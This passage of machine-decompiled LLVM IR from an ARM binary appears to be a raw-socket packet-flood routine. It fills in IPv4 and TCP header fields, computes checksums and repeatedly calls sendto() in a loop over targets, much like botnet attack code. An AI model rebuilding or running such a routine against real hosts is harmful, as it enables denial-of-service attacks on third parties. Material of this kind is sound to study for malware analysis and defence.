  store i32 %v4_bccc, i32* %v7_bcd8, align 4
  %v3_bcdc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bcdc, i32* %r3.global-to-local, align 4
  %v0_bce0 = load i32, i32* %ip.global-to-local, align 4
  %v4_bce0 = mul i32 %v3_bcdc, 4
  %v5_bce0 = add i32 %v0_bce0, %v4_bce0
  %v6_bce0 = inttoptr i32 %v5_bce0 to i32*
  %v7_bce0 = load i32, i32* %v6_bce0, align 4
  store i32 %v7_bce0, i32* @r7, align 4
  %v1_bce4 = inttoptr i32 %v7_bce0 to i8*
  %v2_bce4 = load i8, i8* %v1_bce4, align 1
  %tmp98 = urem i8 %v2_bce4, 16
  %v1_bce8 = zext i8 %tmp98 to i32
  %v1_bcec = or i32 %v1_bce8, 64
  store i32 %v1_bcec, i32* %r2.global-to-local, align 4
  %v1_bcf0 = trunc i32 %v1_bcec to i8
  store i8 %v1_bcf0, i8* %v1_bce4, align 1
  %v0_bcf4 = load i32, i32* @r7, align 4
  %v1_bcf4 = inttoptr i32 %v0_bcf4 to i8*
  %v2_bcf4 = load i8, i8* %v1_bcf4, align 1
  %v1_bcf8 = and i8 %v2_bcf4, -16
  %v1_bcfc = or i8 %v1_bcf8, 5
  store i32 %v1_ba1c, i32* %r1.global-to-local, align 4
  store i8 %v1_bcfc, i8* %v1_bcf4, align 1
  %v2_bd0c = load i32, i32* @r7, align 4
  %v3_bd0c = add i32 %v2_bd0c, 1
  %v4_bd0c = inttoptr i32 %v3_bd0c to i8*
  store i8 %v5_b9d4, i8* %v4_bd0c, align 1
  store i32 %v5_ba10, i32* %r3.global-to-local, align 4
  %v0_bd14 = load i32, i32* %r1.global-to-local, align 4
  %v2_bd14 = icmp eq i32 %v0_bd14, 0
  store i1 %v2_bd14, i1* %cpsr_z.global-to-local, align 1
  %v2_bd18 = load i32, i32* @r7, align 4
  %v3_bd18 = add i32 %v2_bd18, 8
  %v4_bd18 = inttoptr i32 %v3_bd18 to i8*
  store i8 %v1_bd18, i8* %v4_bd18, align 1
  store i32 %v4_bd1c, i32* %r2.global-to-local, align 4
  %v0_bd20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd20, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bcc0
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bd24 = load i32, i32* @r7, align 4
  %v4_bd24 = add i32 %v3_bd24, 6
  %v5_bd24 = inttoptr i32 %v4_bd24 to i8*
  store i8 64, i8* %v5_bd24, align 1
  %v0_bd2c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_bd2c.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bcc0, %bb
  %v0_bd2c.off0 = phi i8 [ %extract.t, %dec_label_pc_bcc0 ], [ %extract.t27, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_bd2c = load i32, i32* @r7, align 4
  %v3_bd2c = add i32 %v2_bd2c, 5
  %v4_bd2c = inttoptr i32 %v3_bd2c to i8*
  store i8 %v0_bd2c.off0, i8* %v4_bd2c, align 1
  store i32 %v4_bd30, i32* %ip.global-to-local, align 4
  store i32 %v4_bd34, i32* %r1.global-to-local, align 4
  %v0_bd38 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd38, label %bb85, label %bb84

bb84:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %bb84
  %v0_bd3c = load i32, i32* %r3.global-to-local, align 4
  %v1_bd3c = trunc i32 %v0_bd3c to i8
  %v2_bd3c = load i32, i32* @r7, align 4
  %v3_bd3c = add i32 %v2_bd3c, 9
  %v4_bd3c = inttoptr i32 %v3_bd3c to i8*
  store i8 %v1_bd3c, i8* %v4_bd3c, align 1
  %v0_bd40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd40, label %bb87, label %bb86

bb86:                                             ; preds = %bb85
  %v1_bd40 = load i32, i32* %r2.global-to-local, align 4
  %v2_bd40 = trunc i32 %v1_bd40 to i8
  %v3_bd40 = load i32, i32* @r7, align 4
  %v4_bd40 = add i32 %v3_bd40, 7
  %v5_bd40 = inttoptr i32 %v4_bd40 to i8*
  store i8 %v2_bd40, i8* %v5_bd40, align 1
  br label %bb87

bb87:                                             ; preds = %bb85, %bb86
  %v3_bd44 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bd44, i32* %r2.global-to-local, align 4
  %v0_bd48 = load i32, i32* %ip.global-to-local, align 4
  %v1_bd48 = trunc i32 %v0_bd48 to i8
  %v2_bd48 = load i32, i32* @r7, align 4
  %v3_bd48 = add i32 %v2_bd48, 2
  %v4_bd48 = inttoptr i32 %v3_bd48 to i8*
  store i8 %v1_bd48, i8* %v4_bd48, align 1
  store i32 %v6_bb6c, i32* %ip.global-to-local, align 4
  %v0_bd50 = load i32, i32* %r2.global-to-local, align 4
  %v3_bd50 = mul i32 %v0_bd50, 32
  store i32 %v3_bd50, i32* %r3.global-to-local, align 4
  %v1_bd54 = load i32, i32* @r7, align 4
  %v2_bd54 = add i32 %v1_bd54, 12
  %v3_bd54 = inttoptr i32 %v2_bd54 to i32*
  store i32 %v6_bb6c, i32* %v3_bd54, align 4
  %v0_bd58 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd58 = load i32, i32* %r2.global-to-local, align 4
  %tmp99 = mul i32 %v1_bd58, -8
  %v5_bd58 = add i32 %v0_bd58, %tmp99
  %v1_bd5c = load i32, i32* @sb, align 4
  %v2_bd5c = add i32 %v1_bd5c, %v5_bd58
  store i32 %v2_bd5c, i32* %r3.global-to-local, align 4
  %v1_bd60 = add i32 %v2_bd5c, 16
  %v2_bd60 = inttoptr i32 %v1_bd60 to i32*
  %v3_bd60 = load i32, i32* %v2_bd60, align 4
  store i32 %v3_bd60, i32* %r2.global-to-local, align 4
  %v0_bd64 = load i32, i32* %r1.global-to-local, align 4
  %v1_bd64 = trunc i32 %v0_bd64 to i8
  %v2_bd64 = load i32, i32* @r7, align 4
  %v3_bd64 = add i32 %v2_bd64, 3
  %v4_bd64 = inttoptr i32 %v3_bd64 to i8*
  store i8 %v1_bd64, i8* %v4_bd64, align 1
  %v0_bd68 = load i32, i32* @r5, align 4
  %v1_bd68 = trunc i32 %v0_bd68 to i8
  %v2_bd68 = load i32, i32* @r7, align 4
  %v3_bd68 = add i32 %v2_bd68, 4
  %v4_bd68 = inttoptr i32 %v3_bd68 to i8*
  store i8 %v1_bd68, i8* %v4_bd68, align 1
  %v0_bd6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bd6c = load i32, i32* @r7, align 4
  %v2_bd6c = add i32 %v1_bd6c, 16
  %v3_bd6c = inttoptr i32 %v2_bd6c to i32*
  store i32 %v0_bd6c, i32* %v3_bd6c, align 4
  %v0_bd70 = load i32, i32* @sl, align 4
  %v1_bd70 = trunc i32 %v0_bd70 to i8
  %v2_bd70 = load i32, i32* @r7, align 4
  %v3_bd70 = add i32 %v2_bd70, 20
  %v4_bd70 = inttoptr i32 %v3_bd70 to i8*
  store i8 %v1_bd70, i8* %v4_bd70, align 1
  %v0_bd74 = load i32, i32* @r7, align 4
  %v1_bd74 = add i32 %v0_bd74, 20
  store i32 %v1_bd74, i32* @r4, align 4
  %v1_bd78 = add i32 %v0_bd74, 33
  %v2_bd78 = inttoptr i32 %v1_bd78 to i8*
  %v3_bd78 = load i8, i8* %v2_bd78, align 1
  %v4_bd78 = zext i8 %v3_bd78 to i32
  store i32 %v1_bc48, i32* %r1.global-to-local, align 4
  %v1_bd80 = and i32 %v4_bd78, 223
  %v5_bd84 = or i32 %v1_bd80, %v4_bd84
  store i32 %v5_bd84, i32* %r3.global-to-local, align 4
  %v1_bd88 = trunc i32 %v5_bd84 to i8
  store i8 %v1_bd88, i8* %v2_bd78, align 1
  %v0_bd8c = load i32, i32* @r4, align 4
  %v1_bd8c = add i32 %v0_bd8c, 13
  %v2_bd8c = inttoptr i32 %v1_bd8c to i8*
  %v3_bd8c = load i8, i8* %v2_bd8c, align 1
  %v4_bd8c = zext i8 %v3_bd8c to i32
  store i32 %v1_bc4c, i32* %r3.global-to-local, align 4
  %v1_bd94 = and i32 %v4_bd8c, 239
  %v5_bd98 = or i32 %v1_bd94, %v4_bd98
  store i32 %v5_bd98, i32* %r2.global-to-local, align 4
  %v1_bd9c = trunc i32 %v5_bd98 to i8
  store i8 %v1_bd9c, i8* %v2_bd8c, align 1
  %v0_bda0 = load i32, i32* @r4, align 4
  %v1_bda0 = add i32 %v0_bda0, 13
  %v2_bda0 = inttoptr i32 %v1_bda0 to i8*
  %v3_bda0 = load i8, i8* %v2_bda0, align 1
  %v4_bda0 = zext i8 %v3_bda0 to i32
  store i32 %v1_bc50, i32* %ip.global-to-local, align 4
  %v1_bda8 = and i32 %v4_bda0, 247
  %v5_bdac = or i32 %v1_bda8, %v4_bdac
  store i32 %v5_bdac, i32* %r3.global-to-local, align 4
  %v1_bdb0 = trunc i32 %v5_bdac to i8
  store i8 %v1_bdb0, i8* %v2_bda0, align 1
  %v0_bdb4 = load i32, i32* @r4, align 4
  %v1_bdb4 = add i32 %v0_bdb4, 13
  %v2_bdb4 = inttoptr i32 %v1_bdb4 to i8*
  %v3_bdb4 = load i8, i8* %v2_bdb4, align 1
  %v4_bdb4 = zext i8 %v3_bdb4 to i32
  store i32 %v1_bc74, i32* %r1.global-to-local, align 4
  %v1_bdbc = and i32 %v4_bdb4, 251
  %v5_bdc0 = or i32 %v1_bdbc, %v4_bdc0
  store i32 %v5_bdc0, i32* %r2.global-to-local, align 4
  %v1_bdc4 = trunc i32 %v5_bdc0 to i8
  store i8 %v1_bdc4, i8* %v2_bdb4, align 1
  %v0_bdc8 = load i32, i32* @r4, align 4
  %v1_bdc8 = add i32 %v0_bdc8, 13
  %v2_bdc8 = inttoptr i32 %v1_bdc8 to i8*
  %v3_bdc8 = load i8, i8* %v2_bdc8, align 1
  %v4_bdc8 = zext i8 %v3_bdc8 to i32
  store i32 %v1_bc78, i32* %r2.global-to-local, align 4
  %v1_bdd0 = and i32 %v4_bdc8, 253
  %v4_bdd4 = or i32 %v1_bdd0, %v3_bdd4
  store i32 %v4_bdd4, i32* %r3.global-to-local, align 4
  %v1_bdd8 = trunc i32 %v4_bdd4 to i8
  store i8 %v1_bdd8, i8* %v2_bdc8, align 1
  %v0_bddc = load i32, i32* @r4, align 4
  %v1_bddc = add i32 %v0_bddc, 12
  %v2_bddc = inttoptr i32 %v1_bddc to i8*
  %v3_bddc = load i8, i8* %v2_bddc, align 1
  %v4_bddc = zext i8 %v3_bddc to i32
  store i32 %v4_bddc, i32* %r2.global-to-local, align 4
  %v1_bde0 = add i32 %v0_bddc, 13
  %v2_bde0 = inttoptr i32 %v1_bde0 to i8*
  %v3_bde0 = load i8, i8* %v2_bde0, align 1
  %v4_bde0 = zext i8 %v3_bde0 to i32
  store i32 %v1_bc7c, i32* %ip.global-to-local, align 4
  %tmp100 = urem i8 %v3_bddc, 16
  %v1_bde8 = zext i8 %tmp100 to i32
  %v1_bdec = and i32 %v4_bde0, 254
  %v2_bdf0 = or i32 %v1_bdec, %v1_bc7c
  store i32 %v2_bdf0, i32* %r3.global-to-local, align 4
  %v1_bdf4 = or i32 %v1_bde8, 80
  store i32 %v1_bdf4, i32* %r2.global-to-local, align 4
  %v1_bdf8 = trunc i32 %v2_bdf0 to i8
  store i8 %v1_bdf8, i8* %v2_bde0, align 1
  %v0_bdfc = load i32, i32* %r2.global-to-local, align 4
  %v1_bdfc = trunc i32 %v0_bdfc to i8
  %v2_bdfc = load i32, i32* @r4, align 4
  %v3_bdfc = add i32 %v2_bdfc, 12
  %v4_bdfc = inttoptr i32 %v3_bdfc to i8*
  store i8 %v1_bdfc, i8* %v4_bdfc, align 1
  store i32 %v3_be04, i32* %r1.global-to-local, align 4
  store i32 %v7_be04, i32* %r2.global-to-local, align 4
  %v2_be08 = load i32, i32* @r4, align 4
  %v3_be08 = add i32 %v2_be08, 1
  %v4_be08 = inttoptr i32 %v3_be08 to i8*
  store i8 %v5_bcb4, i8* %v4_be08, align 1
  %v0_be0c = load i32, i32* %r2.global-to-local, align 4
  %v1_be0c = trunc i32 %v0_be0c to i8
  %v2_be0c = load i32, i32* @r4, align 4
  %v3_be0c = add i32 %v2_be0c, 3
  %v4_be0c = inttoptr i32 %v3_be0c to i8*
  store i8 %v1_be0c, i8* %v4_be0c, align 1
  %v0_be10 = load i32, i32* @r6, align 4
  %v1_be10 = trunc i32 %v0_be10 to i8
  %v2_be10 = load i32, i32* @r4, align 4
  %v3_be10 = add i32 %v2_be10, 2
  %v4_be10 = inttoptr i32 %v3_be10 to i8*
  store i8 %v1_be10, i8* %v4_be10, align 1
  %v0_be14 = load i32, i32* @r8, align 4
  %v1_be14 = load i32, i32* @r4, align 4
  %v2_be14 = add i32 %v1_be14, 4
  %v3_be14 = inttoptr i32 %v2_be14 to i32*
  store i32 %v0_be14, i32* %v3_be14, align 4
  %v0_be18 = call i32 @function_f6c4()
  store i32 %v1_bc80, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_be18, 16777216
  %v1_be20 = sdiv i32 %sext, 16777216
  store i32 %v1_be20, i32* %r2.global-to-local, align 4
  %v3_be24 = ashr i32 %sext, 31
  store i32 %v3_be24, i32* %r3.global-to-local, align 4
  store i1 %v2_be28, i1* %cpsr_z.global-to-local, align 1
  %v1_be2c = trunc i32 %v3_be24 to i8
  %v2_be2c = load i32, i32* @r4, align 4
  %v3_be2c = add i32 %v2_be2c, 15
  %v4_be2c = inttoptr i32 %v3_be2c to i8*
  store i8 %v1_be2c, i8* %v4_be2c, align 1
  %v0_be30 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_be3c.pre = load i32, i32* @r4, align 4
  br i1 %v0_be30, label %.thread13, label %bb88

bb88:                                             ; preds = %bb87
  %v2_be30 = add i32 %v2_be3c.pre, 13
  %v3_be30 = inttoptr i32 %v2_be30 to i8*
  %v4_be30 = load i8, i8* %v3_be30, align 1
  %v5_be30 = zext i8 %v4_be30 to i32
  %v2_be34 = or i32 %v5_be30, 8
  store i32 %v2_be34, i32* %r3.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb87, %bb88
  store i32 %v6_bb30, i32* @r1, align 4
  %v0_be3c = load i32, i32* %r2.global-to-local, align 4
  %v1_be3c = trunc i32 %v0_be3c to i8
  %v3_be3c = add i32 %v2_be3c.pre, 14
  %v4_be3c = inttoptr i32 %v3_be3c to i8*
  store i8 %v1_be3c, i8* %v4_be3c, align 1
  %v0_be40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be40, label %bb90, label %bb89

bb89:                                             ; preds = %.thread13
  %v1_be40 = load i32, i32* %r3.global-to-local, align 4
  %v2_be40 = trunc i32 %v1_be40 to i8
  %v3_be40 = load i32, i32* @r4, align 4
  %v4_be40 = add i32 %v3_be40, 13
  %v5_be40 = inttoptr i32 %v4_be40 to i8*
  store i8 %v2_be40, i8* %v5_be40, align 1
  br label %bb90

bb90:                                             ; preds = %.thread13, %bb89
  %v0_be44 = load i32, i32* @r7, align 4
  %v1_be44 = add i32 %v0_be44, 40
  %v1_be48 = inttoptr i32 %v1_be44 to i8*
  %v2_be48 = call i32 @function_f844(i8* %v1_be48)
  %v3_be4c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_be4c, i32* %r3.global-to-local, align 4
  %v1_be50 = add i32 %v3_be4c, 1
  store i32 %v1_be50, i32* %r4.global-to-local, align 4
  %v0_be54 = load i32, i32* @fp, align 4
  %v9_be54 = icmp eq i32 %v0_be54, %v1_be50
  store i1 %v9_be54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_be50, i32* %stack_var_-40, align 4
  %v8_be5c = icmp sgt i32 %v0_be54, %v1_be50
  br i1 %v8_be5c, label %dec_label_pc_bcc0, label %dec_label_pc_be60

dec_label_pc_be60:                                ; preds = %bb90
  store i32 %v6_bb30, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_be68.preheader

dec_label_pc_be68.preheader:                      ; preds = %dec_label_pc_be60, %dec_label_pc_c0d4
  %v0_be6818 = phi i32 [ %v0_be54, %dec_label_pc_be60 ], [ %v0_bbd4, %dec_label_pc_c0d4 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_bbf4, %dec_label_pc_be60 ], [ %v1_c0dc, %dec_label_pc_c0d4 ]
  %storemerge = add i32 %v6_bb30, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_c020 = icmp eq i32 %v6_bb6c, -1
  %v3_c03c = icmp eq i32 %v3_bbc8, 65535
  %v2_c0b8 = icmp eq i32 %v1_bb58, 0
  br label %dec_label_pc_be68

dec_label_pc_be68:                                ; preds = %dec_label_pc_bf10, %dec_label_pc_be68.preheader
  %v0_be68 = phi i32 [ %v0_be6818, %dec_label_pc_be68.preheader ], [ %v0_bfa4, %dec_label_pc_bf10 ]
  %v2_be68 = icmp eq i32 %v0_be68, 0
  store i1 %v2_be68, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp91 = icmp slt i32 %v0_be68, 1
  br label %dec_label_pc_be70

dec_label_pc_be70:                                ; preds = %dec_label_pc_be70, %dec_label_pc_be68
  br i1 %tmp91, label %dec_label_pc_be70, label %dec_label_pc_be74

dec_label_pc_be74:                                ; preds = %dec_label_pc_be70
  %v0_be74 = load i32, i32* @r8, align 4
  %v3_be74 = mul i32 %v0_be74, 65536
  store i32 %v3_be74, i32* %r2.global-to-local, align 4
  %tmp92 = mul i32 %v0_be74, 256
  %v1_be7c = and i32 %tmp92, 65280
  store i32 %v1_be7c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp93 = udiv i32 %v0_be74, 256
  %v4_be88 = urem i32 %tmp93, 256
  %v5_be88 = or i32 %v4_be88, %v1_be7c
  store i32 %v5_be88, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_be90

dec_label_pc_be90:                                ; preds = %dec_label_pc_bf10, %dec_label_pc_be74
  %v1_bea4 = phi i32 [ %v1_bfa0, %dec_label_pc_bf10 ], [ 0, %dec_label_pc_be74 ]
  %v5_be94 = mul i32 %v1_bea4, 24
  %v1_be98 = load i32, i32* @sb, align 4
  %v2_be98 = add i32 %v1_be98, %v5_be94
  store i32 %v2_be98, i32* %r3.global-to-local, align 4
  store i32 %v4_b99c, i32* %ip.global-to-local, align 4
  %v1_bea0 = add i32 %v2_be98, 20
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v4_bea0, i32* %r2.global-to-local, align 4
  %v4_bea4 = mul i32 %v1_bea4, 4
  %v5_bea4 = add i32 %v4_bea4, %v4_b99c
  %v6_bea4 = inttoptr i32 %v5_bea4 to i32*
  %v7_bea4 = load i32, i32* %v6_bea4, align 4
  store i32 %v7_bea4, i32* @r5, align 4
  %v7_bea8 = icmp eq i8 %v3_bea0, 31
  store i1 %v7_bea8, i1* %cpsr_z.global-to-local, align 1
  %v1_beac = add i32 %v7_bea4, 20
  store i32 %v1_beac, i32* @r6, align 4
  %tmp101 = icmp ult i8 %v3_bea0, 32
  br i1 %tmp101, label %dec_label_pc_bfc4, label %dec_label_pc_beb4

dec_label_pc_beb4:                                ; preds = %dec_label_pc_be90
  store i32 %v6_bb6c, i32* %r1.global-to-local, align 4
  store i1 %v3_c020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c020, label %dec_label_pc_c02c, label %dec_label_pc_bec0

dec_label_pc_bec0:                                ; preds = %dec_label_pc_bfc4, %dec_label_pc_beb4
  store i32 %v3_bbc8, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c03c, label %dec_label_pc_c048, label %dec_label_pc_bed4

dec_label_pc_bed4:                                ; preds = %dec_label_pc_c02c.dec_label_pc_bed4_crit_edge, %dec_label_pc_bec0
  %v1_bed8 = phi i32 [ %v1_bed8.pre, %dec_label_pc_c02c.dec_label_pc_bed4_crit_edge ], [ 65535, %dec_label_pc_bec0 ]
  store i32 %v3_bbcc, i32* %r3.global-to-local, align 4
  %v9_bed8 = icmp eq i32 %v3_bbcc, %v1_bed8
  store i1 %v9_bed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bed8, label %dec_label_pc_c064, label %dec_label_pc_bee0

dec_label_pc_bee0:                                ; preds = %dec_label_pc_c048.dec_label_pc_bee0_crit_edge, %dec_label_pc_bed4
  %v1_bee4 = phi i32 [ %v1_bee4.pre, %dec_label_pc_c048.dec_label_pc_bee0_crit_edge ], [ %v1_bed8, %dec_label_pc_bed4 ]
  store i32 %v3_bbd0, i32* %ip.global-to-local, align 4
  %v9_bee4 = icmp eq i32 %v3_bbd0, %v1_bee4
  store i1 %v9_bee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bee4, label %dec_label_pc_c080, label %dec_label_pc_beec

dec_label_pc_beec:                                ; preds = %dec_label_pc_c064.dec_label_pc_beec_crit_edge, %dec_label_pc_bee0
  %v1_bef0 = phi i32 [ %v1_bef0.pre, %dec_label_pc_c064.dec_label_pc_beec_crit_edge ], [ %v1_bee4, %dec_label_pc_bee0 ]
  store i32 %v6_ba6c, i32* %r1.global-to-local, align 4
  %v9_bef0 = icmp eq i32 %v6_ba6c, %v1_bef0
  store i1 %v9_bef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bef0, label %dec_label_pc_c09c, label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_c080.dec_label_pc_bef8_crit_edge, %dec_label_pc_beec
  %v1_befc = phi i32 [ %v1_befc.pre, %dec_label_pc_c080.dec_label_pc_bef8_crit_edge ], [ %v1_bef0, %dec_label_pc_beec ]
  store i32 %v6_ba88, i32* %r2.global-to-local, align 4
  %v9_befc = icmp eq i32 %v6_ba88, %v1_befc
  store i1 %v9_befc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_befc, label %dec_label_pc_c0b0, label %dec_label_pc_bf04

dec_label_pc_bf04:                                ; preds = %dec_label_pc_c09c, %dec_label_pc_bef8
  store i32 %v1_bb58, i32* %r3.global-to-local, align 4
  store i1 %v2_c0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c0b8, label %dec_label_pc_bf10, label %dec_label_pc_c0c4

dec_label_pc_bf10:                                ; preds = %dec_label_pc_bf04, %dec_label_pc_c0b0, %dec_label_pc_c0c4
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bf14 = load i32, i32* @r7, align 4
  %v1_bf14 = trunc i32 %v0_bf14 to i8
  %v2_bf14 = load i32, i32* @r5, align 4
  %v3_bf14 = add i32 %v2_bf14, 10
  %v4_bf14 = inttoptr i32 %v3_bf14 to i8*
  store i8 %v1_bf14, i8* %v4_bf14, align 1
  %v0_bf18 = load i32, i32* @r7, align 4
  %v1_bf18 = trunc i32 %v0_bf18 to i8
  %v2_bf18 = load i32, i32* @r5, align 4
  %v3_bf18 = add i32 %v2_bf18, 11
  %v4_bf18 = inttoptr i32 %v3_bf18 to i8*
  store i8 %v1_bf18, i8* %v4_bf18, align 1
  %v0_bf1c = load i32, i32* @r5, align 4
  store i32 %v0_bf1c, i32* @r0, align 4
  %v2_bf20 = call i32 @function_de24(i32 %v0_bf1c, i32 20)
  %v3_bf20 = trunc i32 %v2_bf20 to i8
  %v4_bf2429 = udiv i32 %v2_bf20, 256
  %v1_bf28 = trunc i32 %v4_bf2429 to i8
  %v2_bf28 = load i32, i32* @r5, align 4
  %v3_bf28 = add i32 %v2_bf28, 11
  %v4_bf28 = inttoptr i32 %v3_bf28 to i8*
  store i8 %v1_bf28, i8* %v4_bf28, align 1
  %v3_bf2c = load i32, i32* @r5, align 4
  %v4_bf2c = add i32 %v3_bf2c, 10
  %v5_bf2c = inttoptr i32 %v4_bf2c to i8*
  store i8 %v3_bf20, i8* %v5_bf2c, align 1
  %v0_bf30 = load i32, i32* @r6, align 4
  store i32 %v0_bf30, i32* @r1, align 4
  %v0_bf34 = load i32, i32* @sl, align 4
  store i32 %v0_bf34, i32* %r2.global-to-local, align 4
  %v0_bf38 = load i32, i32* @r8, align 4
  store i32 %v0_bf38, i32* %r3.global-to-local, align 4
  %v0_bf3c = load i32, i32* @r7, align 4
  %v1_bf3c = trunc i32 %v0_bf3c to i8
  %v3_bf3c = add i32 %v0_bf30, 16
  %v4_bf3c = inttoptr i32 %v3_bf3c to i8*
  store i8 %v1_bf3c, i8* %v4_bf3c, align 1
  %v0_bf40 = load i32, i32* @r7, align 4
  %v1_bf40 = trunc i32 %v0_bf40 to i8
  %v2_bf40 = load i32, i32* @r6, align 4
  %v3_bf40 = add i32 %v2_bf40, 17
  %v4_bf40 = inttoptr i32 %v3_bf40 to i8*
  store i8 %v1_bf40, i8* %v4_bf40, align 1
  %v0_bf44 = load i32, i32* @r5, align 4
  %v4_bf48 = call i32 @function_de80(i32 %v0_bf44, i32 %v0_bf30, i32 %v0_bf34, i32 %v0_bf38)
  %v5_bf48 = trunc i32 %v4_bf48 to i8
  %v4_bf4c30 = udiv i32 %v4_bf48, 256
  %v1_bf50 = trunc i32 %v4_bf4c30 to i8
  %v2_bf50 = load i32, i32* @r6, align 4
  %v3_bf50 = add i32 %v2_bf50, 17
  %v4_bf50 = inttoptr i32 %v3_bf50 to i8*
  store i8 %v1_bf50, i8* %v4_bf50, align 1
  %v3_bf54 = load i32, i32* @r6, align 4
  %v4_bf54 = add i32 %v3_bf54, 16
  %v5_bf54 = inttoptr i32 %v4_bf54 to i8*
  store i8 %v5_bf48, i8* %v5_bf54, align 1
  %v3_bf58 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v0_bf5c = load i32, i32* @r5, align 4
  %v1_bf5c = add i32 %v0_bf5c, 20
  %v2_bf5c = inttoptr i32 %v1_bf5c to i32*
  %v3_bf5c = load i32, i32* %v2_bf5c, align 4
  %v3_bf64 = udiv i32 %v3_bf5c, 65536
  store i32 %v3_bf64, i32* %r2.global-to-local, align 4
  %v5_bf68 = mul i32 %v3_bf58, 24
  %v1_bf6c = load i32, i32* @sb, align 4
  %v2_bf6c = add i32 %v1_bf6c, %v5_bf68
  store i32 %v2_bf6c, i32* %ip.global-to-local, align 4
  %v3_bf7028 = udiv i32 %v3_bf5c, 16777216
  %v1_bf74 = trunc i32 %v3_bf7028 to i8
  %v3_bf74 = add i32 %v2_bf6c, 3
  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v1_bf74, i8* %v4_bf74, align 1
  %v0_bf78 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf78 = trunc i32 %v0_bf78 to i8
  %v2_bf78 = load i32, i32* %ip.global-to-local, align 4
  %v3_bf78 = add i32 %v2_bf78, 2
  %v4_bf78 = inttoptr i32 %v3_bf78 to i8*
  store i8 %v1_bf78, i8* %v4_bf78, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_bf80 = load i32, i32* @r5, align 4
  store i32 %v0_bf80, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_bf90 = load i32, i32* %ip.global-to-local, align 4
  %v4_bf90 = inttoptr i32 %v0_bf90 to %sockaddr*
  %v7_bf98 = inttoptr i32 %v0_bf80 to i32*
  %v9_bf98 = call i32 @sendto(i32 %v3_bb80, i32* %v7_bf98, i32 %stack_var_-168.0.ph, i32 16384, %sockaddr* %v4_bf90, i32 16)
  %v3_bf9c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bf9c, i32* %r3.global-to-local, align 4
  %v1_bfa0 = add i32 %v3_bf9c, 1
  %v0_bfa4 = load i32, i32* @fp, align 4
  %v9_bfa4 = icmp eq i32 %v0_bfa4, %v1_bfa0
  store i1 %v9_bfa4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bfa0, i32* %stack_var_-40, align 4
  %v7_bfac = icmp sgt i32 %v0_bfa4, %v1_bfa0
  br i1 %v7_bfac, label %dec_label_pc_be90, label %dec_label_pc_be68

dec_label_pc_bfb4:                                ; preds = %dec_label_pc_bb90
  %v1_bfb8 = call i32 @close(i32 %v3_bb80)
  br label %dec_label_pc_bfbc

dec_label_pc_bfbc:                                ; preds = %dec_label_pc_b97c, %dec_label_pc_bfb4
  %v29_bfc0 = phi i32 [ -1, %dec_label_pc_b97c ], [ %v1_bfb8, %dec_label_pc_bfb4 ]
  store i32 %v3_b97c, i32* %r4.global-to-local, align 4
  ret i32 %v29_bfc0

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_be90
  %v1_bfc4 = add i32 %v2_be98, 16
  %v2_bfc4 = inttoptr i32 %v1_bfc4 to i32*
  %v3_bfc4 = load i32, i32* %v2_bfc4, align 4
  store i32 %v3_bfc4, i32* %r4.global-to-local, align 4
  %v0_bfc8 = call i32 @function_f6c4()
  %v3_bfcc = load i32, i32* %stack_var_-40, align 4
  %v5_bfd4 = mul i32 %v3_bfcc, 24
  %v1_bfdc = load i32, i32* @sb, align 4
  %v2_bfdc = add i32 %v1_bfdc, %v5_bfd4
  store i32 %v2_bfdc, i32* %r1.global-to-local, align 4
  %v1_bfe0 = and i32 %v3_bfc4, 65280
  store i32 %v1_bfe0, i32* %r3.global-to-local, align 4
  %v1_bfd8 = udiv i32 %v3_bfc4, 256
